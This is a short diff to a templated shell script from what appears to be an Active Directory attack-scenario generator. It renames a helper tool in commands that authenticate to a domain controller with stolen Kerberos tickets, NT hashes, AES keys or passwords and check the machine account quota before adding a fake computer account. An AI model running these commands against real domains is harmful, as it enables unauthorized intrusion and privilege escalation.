@@ -2,13 +2,13 @@
 # Check if the machine account quota is > zero, otherwise this scenario will not work
 # you can edit config.ml to set AllowAddComputer to false
 {% if parent.krb_auth %}
-./tools/getbyname.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -dc-ip {{dc_ip}} -k -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
+./tools/getbysam.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -dc-ip {{dc_ip}} -k -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
 {%- elif parent.secret_type == T_SECRET_NTHASH %}
-./tools/getbyname.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -dc-ip {{dc_ip}} -hashes :{{parent.secret}} -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
+./tools/getbysam.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -dc-ip {{dc_ip}} -hashes :{{parent.secret}} -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
 {%- elif parent.secret_type == T_SECRET_AESKEY %}
-./tools/getbyname.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -dc-ip {{dc_ip}} -k -aesKey {{parent.secret}} -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
+./tools/getbysam.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -dc-ip {{dc_ip}} -k -aesKey {{parent.secret}} -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
 {%- elif parent.secret_type == T_SECRET_PASSWORD %}
-./tools/getbyname.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret}}@{{dc_name}}' -dc-ip {{dc_ip}} -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
+./tools/getbysam.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret}}@{{dc_name}}' -dc-ip {{dc_ip}} -t {{domain_short_name}} -use-ldaps | grep MachineAccountQuota -A 2
 {% endif %}
 
 # Add a fake computer in the domain
